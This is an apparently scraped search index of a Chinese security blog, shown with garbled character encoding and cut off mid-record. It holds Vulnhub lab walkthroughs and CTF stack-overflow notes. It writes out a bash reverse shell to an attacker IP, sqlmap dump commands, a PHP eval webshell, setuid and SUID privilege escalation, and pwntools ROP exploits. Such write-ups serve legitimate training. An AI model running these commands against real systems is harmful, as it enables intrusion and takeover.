walkthrought","text":"å‰è¨€æ­¦å£«åˆ€è¿™é¢˜ä½œè€…è‡ªè¯„ä¸ºä¸­çº§éš¾åº¦ã€‚ç¡®å®ï¼ŒWebæ–¹é¢åšç€æœ‰ç‚¹è¿·ï¼Œææƒæ–¹é¢åˆå­¦åˆ°äº†ä¸ªå°trickã€‚ https://www.vulnhub.com/entry/katana-1,482/ åˆ©ç”¨è¿‡ç¨‹ç…§æ ·nmapå…¨ç«¯å£æ‰«æï¼Œå¼€äº†ftpã€sshã€sambaå’ŒhttpæœåŠ¡ã€‚ 1nmap -sV -p- -T 4 192.168.189.135 å…ˆå»çœ‹çœ‹80ç«¯å£çš„httpæœåŠ¡ï¼Œdirbæ‰«åˆ°äº†ä¸ªebookç›®å½•ï¼Œå‘ç°åˆ°å¤„éƒ½æ˜¯æ³¨å…¥ã€‚ æ²¡wafç›´æ¥ä¸Šå¤§æ€å™¨sqlmapï¼Œé™¤äº†information_schemaï¼Œè¿˜æœ‰ä¸ªebookåº“ï¼Œé‡Œé¢æœ‰ä¸ªadminè¡¨ï¼Œè®°ç€ç®¡ç†å‘˜å¯†ç ï¼Œå…¶ä»–æ²¡ä»€ä¹ˆä¸œè¥¿ã€‚ 12sqlmap -u http://192.168.189.135/ebook/book.php?bookisbn=978-1-484217-26-9 --batch -D ebook --tablessqlmap -u http://192.168.189.135/ebook/book.php?bookisbn=978-1-484217-26-9 --batch -D ebook -T admin --dump éDBAç”¨æˆ·ï¼Œsqlmapç›´æ¥çˆ†ç ´å‡ºæ¥ç®¡ç†å‘˜å¯†ç ã€‚ è¿›åˆ°åå°åˆæ·»åŠ ä¹¦æœ¬åŠŸèƒ½ï¼Œèƒ½ä¸Šä¼ å›¾ç‰‡ï¼Œä½†å®æµ‹ä¸ç®¡æ˜¯webshellè¿˜æ˜¯æ­£å¸¸å›¾ç‰‡ï¼Œéƒ½æ²¡èƒ½æˆåŠŸä¸Šä¼ ã€‚ åé¢çœ‹å…¶ä»–çš„ç«¯å£ï¼Œåœ¨8088ç«¯å£å‘ç°äº†ä¸ªuploadé¡µé¢ã€‚ä¸€å¼€å§‹ç”¨dirbä»€ä¹ˆä¹Ÿæ²¡æ‰«å‡ºæ¥ï¼ŒåŠ äº†ä¸ª-xå‚æ•°æ‰«åç¼€åå°±å‡ºæ¥äº†ã€‚ 1dirb http://192.168.189.135:8088/ /usr/share/wordlists/dirb/big.txt -x /usr/share/wordlists/dirb/extensions_common.txt ä¸Šä¼ äº†ä¸€ä¸ªwebshellæµ‹è¯•ä¸‹ï¼Œå‘ç°é‡å‘½åç§»å»ä¸€ä¸ªæ–°çš„ç›®å½•ã€‚å½“å‰ç«¯å£è¯•äº†ä¸‹éƒ½æ²¡æ‰¾åˆ°ä¸Šä¼ çš„webshellï¼Œçœ‹ä¸‹walkthoughåŸæ¥æ˜¯åœ¨å…¶ä»–ç«¯å£çš„httpæœåŠ¡ä¸Šã€‚ åœ¨8715ç«¯å£å‘ç°äº†ä¸Šä¼ çš„webshellï¼Œåœ¨è¿™æ­£ç¡®è¦éªŒè¯æˆæƒï¼Œç›´æ¥ç”¨sqlmapè·‘å‡ºæ¥çš„ç®¡ç†å‘˜å¯†ç adminå°±è¡Œäº†ã€‚ ä¸€å¥è¯åå¼¹äº†ä¸ªshellã€‚ 1system('/bin/bash -c \"bash -i &gt;&amp; /dev/tcp/192.168.189.129/4444 0&gt;&amp;1\"'); ç”¨privilege-escalation-awesome-scripts-suiteæ”¶é›†ä¿¡æ¯ï¼Œæ²¡çœ‹è§æœ‰ä»€ä¹ˆèƒ½åˆ©ç”¨çš„ç‚¹ã€‚ ç„äº†ä¸‹ï¼Œç”¨ä¸ªæ–°trickï¼šCapilitiesç‰¹æƒæ“ä½œå±æ€§ï¼Œå…¶ä¸­CAP_SETUIDå±æ€§å¯é€šè¿‡pythonã€perlææƒï¼ŒCAP_DAC_READ_SEARCHå¯é€šè¿‡tarææƒã€‚ ç”¨ä¸‹é¢çš„å‘½ä»¤æœç´¢å…·æœ‰Capilitiesç‰¹æƒæ“ä½œå±æ€§çš„æ–‡ä»¶ã€‚ 1getcap -r / 2&gt;/dev/null python è®¾ç½®uidï¼Œå†å¼¹ä¸ªshellå³å¯ææƒï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š 1/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'","link":"/2020/06/19/Katana_walkthough/"},{"title":"[PWN]cmcc_simplerop","text":"cmcc_simplerop Writeup https://buuoj.cn/challenges#cmcc_simplerop IDAæ‰“å¼€é™„ä»¶å‘ç°ä¸»ç¨‹åºå°±æ˜¯ç®€å•çš„æ ˆæº¢å‡ºã€‚ å¹¶ä¸”æ˜¯é™æ€é“¾æ¥çš„ç¨‹åºï¼ŒæŸ¥æ‰¾systemå‡½æ•°ä¸å­˜åœ¨ï¼Œä½†å‘ç°äº†mprotectå‡½æ•°ã€‚ mprotect(const void *start, size_t len, int prot)å‡½æ•°èƒ½æ”¹å˜ä¸€ä¸ªå†…å­˜åŒºçš„ä¿æŠ¤å±æ€§ï¼ŒæŒ‡å®šçš„å†…å­˜åŒºé—´å¿…é¡»åŒ…å«æ•´ä¸ªå†…å­˜é¡µï¼Œæˆ‘åšåˆ°çš„é¢˜ç›®é¡µå¤§å°é€šå¸¸ä¸º1Kã€‚æ—¢è‹¥è¦æ”¹å˜bssçš„ä¿æŠ¤å±æ€§ï¼Œbssçš„åœ°å€ä¸º0x80eaf80ï¼Œåˆ™èµ·å§‹åœ°å€ä¸º0x80ea000ï¼Œé¡µå¤§å°ä¸º1000ï¼Œæƒé™ä¸º7è¡¨ç¤ºå¯è¯»å¯å†™å¯æ‰§è¡Œã€‚ ç°åœ¨çš„æ€è·¯æ˜¯é€šè¿‡mprotectæ”¹å˜bssçš„ä¿æŠ¤å±æ€§ï¼Œå†é€šè¿‡readå†™å…¥shellcodeï¼Œè·³è½¬åˆ°bsså¤„æ‰§è¡Œã€‚ ä»¥ä¸‹æ˜¯expã€‚ 1234567891011121314151617181920212223242526272829from pwn import *context.log_level = 'DEBUG'context.binary = './simplerop'if sys.argv[1] == 'l': p = process('./simplerop')else: p = remote('node3.buuoj.cn',28957)elf = ELF('./simplerop')bss = elf.bss()print(hex(bss))mprotect_sym = elf.sym['mprotect']read_sym = elf.sym['read']pop3 = 0x08048913payload = flat(cyclic(32),mprotect_sym,pop3,0x80ea000,0x1000,0x7,read_sym,pop3,0x0,bss+0x50,0x50,bss+0x50)p.recvuntil(':')# gdb.attach(p)p.send(payload)sleep(1)p.send(asm(shellcraft.sh()))p.interactive() åè¯å½“æˆ‘æƒ³è¦åœ¨ç¬¬ä¸€ä¸ªsendå‰è°ƒè¯•çš„æ—¶å€™ï¼Œæ¯æ¬¡ç¨‹åºéƒ½å¼‚å¸¸é€€å‡ºã€‚ä¸€å¼€å§‹è¿˜ä»¥ä¸ºæ˜¯payloadæœ‰é”™ï¼Œåæ¥å»åˆ°bssæŸ¥çœ‹çš„æ—¶å€™å‘ç°shellcodeå¹¶ä¹ˆæœ‰è¾“å…¥å…¨ã€‚ä¼°è®¡æ˜¯ç”±äºè°ƒè¯•ç¨‹åºï¼Œå‘é€shellcodeæ¯”readè¯»å–å¾·è¦å¿«ï¼Œå¯¼è‡´æ²¡æœ‰è¾“å…¥å…¨ï¼Œæ³¨é‡Šæ‰è°ƒè¯•å°±æ²¡æœ‰å¼‚å¸¸é€€å‡ºäº†ã€‚","link":"/2020/03/06/PWN-cmcc_simplerop/"},{"title":"[PWN]æ ˆæº¢å‡º-ROPå­¦ä¹ ç¬”è®°","text":"ROPç®€ä»‹ é¢å‘è¿”å›ç¼–ç¨‹ï¼ˆè‹±è¯­ï¼šReturn-Oriented Programmingï¼Œç¼©å†™ï¼šROPï¼‰æ˜¯è®¡ç®—æœºå®‰å…¨æ¼æ´åˆ©ç”¨æŠ€æœ¯ï¼Œè¯¥æŠ€æœ¯å…è®¸æ”»å‡»è€…åœ¨å®‰å…¨é˜²å¾¡ï¼ˆä¸»è¦ä¸ºNXï¼Œ å †æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤ï¼‰çš„æƒ…å†µä¸‹æ‰§è¡Œä»£ç ï¼Œå¦‚ä¸å¯æ‰§è¡Œçš„å†…å­˜å’Œä»£ç ç­¾åã€‚æ”»å‡»è€…æ§åˆ¶å †æ ˆè°ƒç”¨ä»¥åŠ«æŒç¨‹åºæ§åˆ¶æµå¹¶æ‰§è¡Œé’ˆå¯¹æ€§çš„æœºå™¨è¯­è¨€æŒ‡ä»¤åºåˆ—ï¼ˆç§°ä¸ºGadgetsï¼‰ã€‚ æ¯ä¸€æ®µgadgeté€šå¸¸ç»“æŸäºreturnæŒ‡ä»¤ï¼Œå¹¶ä½äºå…±äº«åº“ä»£ç ä¸­çš„å­ç¨‹åºã€‚ è‹¥ç¨‹åºæ»¡è¶³å¯ä»¥æ§åˆ¶è¿”å›åœ°å€å’Œå¯ä»¥æ‰¾åˆ°ç¬¦åˆè¦æ±‚çš„gadgetsä»¥åŠgadgetsåœ°å€ï¼Œå°±è¿›è¡ŒROPã€‚æˆ‘ä»¬é€‰æ‹©çš„gadgetså¤§å¤šæ˜¯pop register;ret;æˆ–è€…mov register xx;ret;ä¹‹ç±»çš„ï¼ˆæˆ‘é‡åˆ°çš„å¤§å¤šæ•°æƒ…å†µæ˜¯è¿™æ ·çš„ï¼Œé”™äº†è¯·åˆ°äº†æ‰“è„¸ï¼‰å¯¹å¯„å­˜å™¨èµ‹å€¼ã€‚ ä»¥ä¸‹ä¾‹å­éƒ½é»˜è®¤å¼€å¯äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤ é™æ€é“¾æ¥åŸç†æœ‰çš„ç¨‹åºç¼–è¯‘æ—¶å€™ä½¿ç”¨çš„æ˜¯é™æ€é“¾æ¥ï¼Œæ‰€ä»¥åº“é‡Œæ‰€æœ‰å‡½æ•°çš„pltå°±æœ‰äº†ã€‚ ä¾‹å­hackmeçš„ROP ret2textåŸç†é€šè¿‡ç¨‹åºå·²æœ‰çš„ä»£ç æ„é€ ROPé“¾ã€‚ ä¾‹å­ctf-wilkiçš„ret2textï¼Œç¨‹åºä¸­å°±å­˜åœ¨system(&quot;/bin/sh&quot;)ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨system(&quot;/bin/sh&quot;)è¿›è¡Œgetshellã€‚ 12345678910111213void secure(){ unsigned int v0; // eax int input; // [esp+18h] [ebp-10h] int secretcode; // [esp+1Ch] [ebp-Ch] v0 = time(0); srand(v0); secretcode = rand(); __isoc99_scanf((const char *)&amp;unk_8048760, &amp;input); if ( input == secretcode ) system(\"/bin/sh\");} å†çœ‹çœ‹IDAä¸­mainå‡½æ•°çš„ä¼ªä»£ç ã€‚ 1234567891011int __cdecl main(int argc, const char **argv, const char **envp){ char s; // [esp+1Ch] [ebp-64h] setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(\"There is something amazing here, do you know anything?\"); gets(&amp;s); printf(\"Maybe I will tell you next time !\"); return 0;} getså‡½æ•°æ²¡æœ‰é™åˆ¶è¾“å…¥é•¿åº¦ï¼Œæ˜¯ä¸€ä¸ªå…¸å‹çš„å †æ ˆæº¢å‡ºã€‚æˆ‘ä»¬åˆ©ç”¨gdbçš„æ’ä»¶pedaçš„åŠŸèƒ½ï¼Œpattcå’Œpattså°±å¯ä»¥è®¡ç®—å‡ºå¡«å……æ•°æ®çš„å¤§å°112ã€‚è€Œsystem(&quot;/bin/sh&quot;)çš„åœ°å€æ˜¯ï¼‰0x8048648ã€‚æœ€åç¥­ä¸Šç¥å™¨pwntoolsã€‚ 123456789from pwn import *system_plt=0x8048648shellcode='a'*112+p32(system_olt)p.recv()p=process('./ret2text')p.sendline()p.interactive() ret2shellcodeåŸç†è‹¥ç¨‹åºæ ˆä¸å¯æ‰§è¡Œï¼Œä½†æˆ‘ä»¬å¯ä»¥æ§åˆ¶å…¶ä»–å¯æ‰§è¡Œçš„æ®µï¼Œå¦‚bssæ®µï¼ˆå­˜å‚¨å…¨å±€å˜é‡ï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°†shellcodeå†™å…¥å…¶ä¸­ï¼Œå†æ§åˆ¶ç¨‹åºè¿”å›åœ°å€è·³è½¬åˆ°è¿™é‡Œæ‰§è¡Œshellcodeã€‚ ä¾‹å­ä»¥ctf-wikiçš„ret2shellcodeä¸ºä¾‹ã€‚ 123456789101112int __cdecl main(int argc, const char **argv, const char **envp){ int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(\"No system for you this time !!!\"); gets((char *)&amp;v4); strncpy(buf2, (const char *)&amp;v4, 0x64u); printf(\"bye bye ~\"); return 0;} ä¸å‰é¢çš„ret2textç›¸ä¼¼ï¼Œä½†è¿™é‡Œå·²ç»æ²¡æœ‰system(&quot;/bin/sh&quot;),å–è€Œä»£ä¹‹çš„æ˜¯strncpyã€‚è™½ç„¶strncpyä¸å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼Œä½†è¿™é‡Œçš„buf2æ˜¯åœ¨bssæ®µä¸Šï¼Œæˆ‘ä»¬èƒ½å°†shellcodeå¤åˆ¶åˆ°bssæ®µé‡Œï¼Œå†æ§åˆ¶ç¨‹åºè·³è½¬åˆ°bssæ®µæ‰§è¡Œshellcodeã€‚ 1234567891011#-*-coding:utf-8-*-#!/usr/bin/env pythonfrom pwn import *sh = process('./ret2shellcode')shellcode = asm(shellcraft.sh())#shellcraftæ˜¯pwntoolsçš„shellcodeç”Ÿæˆå™¨buf2_addr = 0x804a080sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))sh.interactive() ret2syscallåŸç†syscallå³ç³»ç»Ÿè°ƒç”¨ï¼Œé€šè¿‡è°ƒç”¨å·è°ƒç”¨ç³»ç»Ÿå‡½æ•°ã€‚ å¾…ç»­ã€‚ã€‚å‚è€ƒèµ„æ–™ åŸºæœ¬ ROP å†è®® PLT ä¸ GOT","link":"/2019/05/25/PWN-æ ˆæº¢å‡º-ROPå­¦ä¹ ç¬”è®°/"},{"title":"Seppuku walkthrought","text":"å‰è¨€è¿™ä¸ªé¶æœºä½œè€…è‡ªè¯„éš¾åº¦Intermediateåˆ°Hardï¼Œå…¶å®ä¹Ÿä¸éš¾ã€‚Webæ–¹é¢è€ƒçš„æ˜¯ä¿¡æ¯æ”¶é›†çš„èƒ½åŠ›ï¼Œææƒæ–¹é¢è€ƒçš„å¯æå–çš„ç‚¹ä¸²è”åˆ©ç”¨çš„èƒ½åŠ›ã€‚ https://www.vulnhub.com/entry/seppuku-1,484/ åˆ©ç”¨è¿‡ç¨‹nmapæ”¶é›†ç«¯å£å¼€å¯çš„ä¿¡æ¯ï¼Œå‘ç°å¼€å¯äº†ftpã€sshã€sambaå’Œå¥½å‡ ä¸ªçš„httpæœåŠ¡ã€‚ ä¹ æƒ¯å…ˆçœ‹httpçš„æœåŠ¡ã€‚80ç«¯å£çš„httpæœåŠ¡æœ‰nginxçš„åŸºç¡€è®¤è¯ï¼Œå…ˆæ”¾ç€ã€‚ ç”¨dirbæ‰«7080ã€7601å’Œ8088ä¸Šé¢çš„æœåŠ¡ï¼Œå‘ç°7061çš„ç›®å½•éƒ½å­˜åœ¨ç›®å½•éå†ï¼Œåœ¨keyså’Œsecretç›®å½•ä¸‹è¿˜æœ‰äº›æœ‰ç”¨çš„ä¸œè¥¿ã€‚ åˆ†åˆ«æ˜¯sshçš„ç§é’¥å’Œpasswdã€shadowçš„å¤‡ä»½å’Œä¸€ä¸ªå­—å…¸ã€‚å…ˆç”¨å­—å…¸å°è¯•çˆ†ç ´ä¸‹shadowï¼Œshadowæœ€åä¸€ä¸ªç”¨æˆ·çš„rabbitçš„aç”¨çš„æ˜¯@ï¼Œè·Ÿå‰é¢çš„passwdä¸ä¸€æ ·ï¼Œäºæ˜¯æŠŠä»–æ”¹å›æ¥ã€‚ ç”¨unshadowå§passwdå’Œshadowè½¬ä¸ºjohnå¯ä»¥è¯†åˆ«çš„æ ¼å¼ï¼Œå¹¶ç”¨johnæŒ‰ä¿¡æ¯æ”¶é›†åˆ°çš„å¯†ç å­—å…¸è¿›è¡Œçˆ†ç ´ã€‚ 12unshadow passwd.bak shadow.bak &gt; passwd.johnjohn -w=password.lst passwd.john sshæ²¡æˆåŠŸè¿ä¸Šï¼Œä¼°è®¡å°±æ˜¯ä½œè€…æŒ–çš„ä¸€ä¸ªå‘ã€‚æ¥ç€åˆç”¨hydraçˆ†ç ´ç”¨æˆ·seppukuçš„å£ä»¤ï¼Œç”¨ä¿¡æ¯æ”¶é›†çš„å¯†ç å­—å…¸æˆåŠŸçˆ†ç ´å‡ºæ¥ã€‚ ä¾æ—§ç”¨privilege-escalation-awesome-scripts-suiteä¿¡æ¯æ”¶é›†ï¼Œçœ‹åˆ°sudo -lé¡¹æœ‰ä¸ªè½¯è¿æ¥rootåˆ°tmpçš„å‘½ä»¤ï¼Œå·²å­˜åœ¨tmpç›®å½•ï¼Œå¥½åƒæ²¡ä»€ä¹ˆç”¨ã€‚ ä½†åœ¨homeç›®å½•ä¸‹å‘ç°äº†ä¸ªå±äºrootçš„æ–‡ä»¶.passwdï¼Œæ–‡ä»¶åå’Œå†…å®¹çœ‹èµ·æ¥åƒå¯†ç ã€‚ è¯•äº†ä¸‹èƒ½ç™»å½•åˆ°samuraiï¼Œå†ä¸€æ¬¡æ”¶é›†ä¿¡æ¯ï¼Œsudo -låˆæœ‰æ–°çš„ä¸œè¥¿ã€‚ ä½†æ˜¯tantoçš„homeç›®å½•ä¸‹æ²¡æœ‰.cgi_binç›®å½•ï¼Œæ›´æ²¡æœ‰binå¯æ‰§è¡Œæ–‡ä»¶ã€‚ä¸è¿‡åœ¨ä»–çš„.sshç›®å½•ä¸‹å‘ç°äº†ä¸ªsshå…¬é’¥ï¼Œé©¬ä¸Šæƒ³åˆ°äº†ä¹‹å‰webä¿¡æ¯æ”¶é›†åˆ°çš„sshç§é’¥ï¼ŒsshæˆåŠŸè¿ä¸Šã€‚ åˆ°homeå»ºä¸ª.cgi_binç›®å½•ï¼Œå¹¶è¾“å…¥/bin/bashã€‚ åˆ‡å›seppukuç”¨æˆ·ï¼Œsudoé‚£æ¡å‘½ä»¤ï¼ŒæˆåŠŸæå–ã€‚","link":"/2020/06/20/Seppuku_walkthrough/"},{"title":"Sumo walkthrought","text":"å‰è¨€è¿™ä¹Ÿæ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„é¶æœºï¼Œç”¨åˆ°çš„çŸ¥è¯†ç‚¹æ˜¯CVE-2014-6278çš„bashå‘½ä»¤æ³¨å…¥å’Œdirtycowææƒã€‚ https://www.vulnhub.com/entry/sumo-1,480/ åˆ©ç”¨è¿‡ç¨‹æ‹¿åˆ°æ‰‹è‚¯å®šæ˜¯è¦ä¿¡æ¯æ”¶é›†ä¸€æ³¢ï¼Œnmapæ‰«åˆ°åªå¼€æ”¾äº†22ç«¯å£å’Œ80ç«¯å£ã€‚ 80ç«¯å£è¿›å»æ˜¯é»˜è®¤é¡µé¢ï¼Œç›®å½•æ‰«å‡ºäº†cgi-binå’Œserver-statusç›®å½•ï¼ŒçŠ¶æ€ç éƒ½æ˜¯403ã€‚ å†ç”¨niktoæ‰«ä¸‹ï¼Œæ‰«å‡ºæ¥äº†CVE-2014-6278å’ŒCVE-2014-6271ï¼Œæ˜¯bashå‘½ä»¤æ³¨å…¥çš„æ¼æ´ï¼Œmsfé‡Œå·²æœ‰expã€‚ è¿›msfé€‰ä¸­åˆ©ç”¨æ¨¡å—ï¼Œè®¾ç½®å¥½å‚æ•°ï¼Œæ”»å‡»åæ­£å¸¸è¿”å›ä¸€ä¸ªmeterpreter sessionã€‚ å¯åŠ¨ä¸€ä¸ªshellä¹‹åï¼Œè¿è¡Œwhoamiå‘½ä»¤å’Œuname -aå‘½ä»¤ã€‚å½“å‰ç”¨æˆ·æ˜¯www-dataï¼Œå¹¶ä¸”å‘ç°å†…æ ¸ç‰ˆæœ¬è¾ƒä½ï¼Œå¯ç”¨dirtycowææƒã€‚ ä½¿ç”¨githubä¸Šçš„exp https://github.com/FireFart/dirtycow ä¸Šä¼ åˆ°é¶æœºï¼Œå¹¶ç”¨ä»¥ä¸‹å‘½ä»¤ç¼–è¯‘è¿è¡Œ 12gcc dirty.c -o dirty lpthread./dirty &lt;new_password&gt; å‘½ä»¤æ‰§è¡Œåè¦ç­‰ä¸€æ®µæ—¶é—´ï¼ŒæˆåŠŸåä¼šåˆ›å»ºåä¸ºfirefartçš„rootç”¨æˆ·ï¼Œå¯†ç ä¸ºè¿è¡Œå‘½ä»¤æ—¶è¾“å…¥çš„å¯†ç ã€‚ sshç™»å½•ä¸Šå»ï¼Œåœ¨/rootç›®å½•å³å¯è·å¾—flagã€‚","link":"/2020/06/12/Sumo-walkthrough/"},{"title":"Tre1 walkthrought","text":"å‰è¨€è¿™ä¸ªé¶æœºWebéƒ¨åˆ†è®¾è®¡å¾—éå¸¸realï¼Œææƒéƒ¨åˆ†å‡ æ­¥èµ°å®ç°ææƒï¼Œä¸»è¦è€ƒçš„ä¿¡æ¯æ”¶é›†ã€‚æ€»ä½“æ¥è¯´ä¸é”™å¾—ä¸€ä¸ªé¶æœºã€‚ https://www.vulnhub.com/entry/tre-1,483/ åˆ©ç”¨è¿‡ç¨‹nmapå¼€æ‰«ï¼Œå‘ç°å¼€äº†sshå’Œ80ã€8082ä¸¤ä¸ªç«¯å£å¾—httpæœåŠ¡ã€‚ 80å’Œ8082ç«¯å£åŒæ—¶ç”¨dirbå¼€æ‰«ç›®å½•ã€‚8082ç«¯å£é™¤äº†index.htmlï¼Œå¹¶æ²¡æœ‰å‘ç°ä»€ä¹ˆã€‚ 80ç«¯å£ä¸‹å´æœ‰ä¸å°‘ä¸œè¥¿ï¼Œæ ¹è·¯å¾„ä¸‹æ•°æ®åº“è¿æ¥æµ‹è¯•çš„é¡µé¢å’Œphpinfoé¡µé¢ã€‚ 1dirb http://192.168.189.137/ /usr/share/wordlists/dirb/big.txt -x /usr/share/wordlists/dirb/extensions_common.txt mantisbtç›®å½•ä¸‹è¿˜æœ‰ä¸ªæ¼æ´æŠ¥å‘Šçš„ç³»ç»Ÿã€‚ adminer.phpé¡µé¢å°è¯•å¼±å£ä»¤å’ŒMysqlå®¢æˆ·ç«¯æ–‡ä»¶è¯»å–æ— æœã€‚ ç»§ç»­åé¢çš„mantisbtç›®å½•ï¼Œå‘ç°mantisbtçš„å­ç›®å½•åŸºæœ¬éƒ½èƒ½ç›®å½•éå†ï¼Œåœ¨configç›®å½•ä¸‹æ‰¾åˆ°äº†ä¸¤ä¸ªæœ‰ç”¨çš„æ–‡ä»¶ï¼ša.txtå’Œdata.sqlï¼Œåº”è¯¥æ˜¯ä½œè€…ç•™ä¸‹äº†çš„çº¿ç´¢ã€‚ a.txté‡Œè®°å½•ç€æ•°æ®åº“å¯†ç ï¼Œåˆšå¥½åœ¨adminerèƒ½æ´¾ä¸Šç”¨åœºã€‚ data.sqlæ–‡ä»¶é‡Œéƒ½æ˜¯åˆ›å»ºæ•°æ®åº“çš„SQLè¯­å¥ï¼Œä½†é‡Œé¢æœ‰æ¡æ’å…¥åˆ°mantis_user_tableè¡¨çš„æ“ä½œå°±æ˜æ˜¾ä¸å¯»å¸¸ã€‚passwordå­—æ®µçš„MD5æ‹¿å»cmd5åŒ¹é…å¾—å‡ºä¸ºroot ç”¨a.txté‡Œè·å–åˆ°çš„æ•°æ®åº“å¯†ç æˆåŠŸç™»å½•è¿›äº†adminerï¼Œé¦–å…ˆæƒ³åˆ°çš„æ˜¯into outfileå†™webshellï¼Œç„¶è€Œæ²¡æƒé™ã€‚ 1select &apos;&lt;?php eval($_GET[cmd]);?&gt;&apos; into outfile &apos;/var/www/html/shell.php&apos;; å°†passwordå­—æ®µçš„MD5æ›¿æ¢ä¸ºrootçš„MD5ï¼Œç™»å½•è¿›æ¼æ´æŠ¥å‘Šç³»ç»Ÿã€‚ çœ‹è§æ˜¯æ¯”è¾ƒæ–°çš„ç‰ˆæœ¬ï¼Œæ¯•ç«Ÿæ˜¯æ¼æ´æŠ¥å‘Šç³»ç»Ÿï¼Œä¼°è®¡ä¹Ÿæ²¡ä»€ä¹ˆæ¼æ´ã€‚ è¿™æ—¶ç•™æ„åˆ°ç”¨æˆ·è¡¨treçš„realnameä¸åŒå¯»å¸¸ï¼Œçœ‹è€…æœ‰ç‚¹åƒå¯†ç ã€‚è¯•ä¸‹sshç™»å½•ï¼Œæœç„¶å°±è¿›å»äº†ã€‚ ä¸Šä¼ privilege-escalation-awesome-scripts-suiteçš„è„šæœ¬æ”¶é›†ä¿¡æ¯ï¼Œæ³¨æ„åˆ°/usr/bin/ç›®å½•ä¸‹çš„check-systemå¯æ‰§è¡Œæ–‡ä»¶å¯å†™ï¼Œå¹¶ä¸”rootç”¨æˆ·åœ¨è¿è¡Œè¿™ä¸ªå‘½ä»¤ã€‚å‘½ä»¤å†…å®¹å¦‚ä¸‹ï¼Œæ­»å¾ªç¯echoã€‚ã€‚ã€‚ 12345678DATE=`date '+%Y-%m-%d %H:%M:%S'`echo \"Service started at ${DATE}\" | systemd-cat -p infowhile :doecho \"Checking...\";sleep 1;done ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯åœ¨å®šæ—¶ä»»åŠ¡é‡Œç”¨åˆ°è¿™ä¸ªå‘½ä»¤ï¼Œç„¶è€Œå¹¶æ²¡æœ‰ï¼Œä»”ç»†æ‰¾äº†æ‰¾å‘ç°åœ¨/etc/systemd/system/é‡Œæ³¨å†Œæˆäº†æœåŠ¡ã€‚ è¿™ä¸ªç›®å½•ä¸‹çš„æœåŠ¡ä¼šå¼€æœºå¯åŠ¨ï¼Œsudo -låˆšå¥½çœ‹è§shutdownå‘½ä»¤èƒ½å…å¯†ç sudoã€‚ å¼€å§‹æƒ³æ˜¯åå¼¹shellï¼Œç»“æœæ²¡æˆåŠŸï¼Œäºæ˜¯ç”¨ç»™findå‘½ä»¤èµ‹SUIDå±æ€§çš„æ–¹ææƒã€‚ 1chmod u+s /usr/bin/find ç”¨mançœ‹äº†ä¸‹shutdownçš„ä½¿ç”¨æ–¹æ³•ï¼Œ-rå‚æ•°èƒ½å¤Ÿé‡å¯é¶æœºï¼Œäºæ˜¯ä¹â€¦ 1sudo /sbin/shutdown -r 0 å¾…é‡å¯å®Œé‡æ–°è¿ä¸Šsshåï¼Œfindææƒè€æ“ä½œã€‚ 1find . -exec /bin/bash -p \\;","link":"/2020/06/20/Tre1_walkthrough/"},{"title":"[åŸŸæ¸—é€]Vulnstack1_walkthrough","text":"å‰è¨€æœ€è¿‘æƒ³æ‰¾æ‰¾éIISä¸­é—´ä»¶çš„windowså®æˆ˜æ¥ææï¼Œä½†æ˜¯æš‚æ—¶æ²¡æ‰¾åˆ°ï¼Œä¸è¿‡æ— æ„ä¸­çœ‹åˆ°çº¢æ—¥å®‰å…¨åšçš„ï¼Œç»ƒä¹ åŸŸæ¸—é€çš„windowsé¶æœºï¼švulnstackï¼Œæ„Ÿè§‰ä¸é”™ã€‚ ç¯å¢ƒæ­å»ºæŒ‰ç…§çº¢æ—¥å®‰å…¨å…¬ä¼—å·çš„æ–‡ç« ï¼Œå…ˆåœ¨vmwareçš„è™šæ‹Ÿç½‘ç»œç¼–è¾‘å™¨çš„æ·»åŠ ä¸¤ä¸ªä»…ä¸»æœºçš„è™šæ‹Ÿç½‘ç»œï¼Œç½‘æ®µåˆ†åˆ«ä¸º192.168.52.0å’Œ192.168.72.0ã€‚ Windows 7 x64å†æ·»åŠ å¤šä¸€ä¸ªç½‘å¡ï¼Œåˆ†åˆ«è¿ä¸ŠVMnet1å’ŒVMnet2ï¼›Win2k3 Metasploiteableå’ŒWindows Server 2008 R2 x64è¿ä¸ŠVMnet1ï¼›æœ€åæ”»å‡»è€…ä¸»æœºæœ€åè¿ä¸ŠVMnet2ã€‚ æœ€åçš„æœ€åè¿˜éœ€è¦ç”¨å¯†ç hongrisec@2019ç™»å½•åˆ°Windows 7 x64ï¼Œåœ¨C:\\phpStudyç›®å½•é‡Œï¼Œæ‰‹åŠ¨å¯åŠ¨phpStudyã€‚ åˆ©ç”¨è¿‡ç¨‹ä¿¡æ¯æ”¶é›†nmapæ‰«äº†ä¸‹å‘ç°å¼€å¯äº†80å’Œ3306ç«¯å£ï¼ŒphpStudyçš„mysqlç”¨æˆ·åå’Œé»˜è®¤å¯†ç éƒ½ä¸ºrootï¼Œä¼°è®¡éƒ½æ²¡æ”¹ï¼Œç›´æ¥èƒ½åœ¨å¤–ç½‘è¿ä¸Šmysqlã€‚ httpæœåŠ¡æ‰“å¼€æ˜¯ä¸€ä¸ªphpStudyçš„æ¢é’ˆï¼Œæ³„éœ²äº†webç›®å½•çš„ç»å¯¹è·¯å¾„ã€‚ æ‰«ç›®å½•å°±æ‰«å‡ºæ¥ä¸ªphpmyAdminå’Œphpinfoã€‚ æ‰“ç‚¹phpmyAdminç”¨ä¼—æ‰€å‘¨çŸ¥çš„ç”¨æˆ·å’Œå¯†ç rootï¼Œå°±èƒ½ç™»å½•è¿›å»ã€‚phpStudyçš„mysqlä¹Ÿæ˜¯é«˜æƒé™è¿è¡Œçš„ï¼Œå†™æ–‡ä»¶getshellåº”è¯¥æ²¡ä»€ä¹ˆé—®é¢˜ã€‚ into outfileåœ¨è¿™é‡Œç”¨ä¸äº†ï¼Œç”¨ä¸‹é¢çš„payloadä¸€æ¬¡æ€§å†™å¥½shellã€‚ 1234set global general_log = &apos;ON&apos;;set global 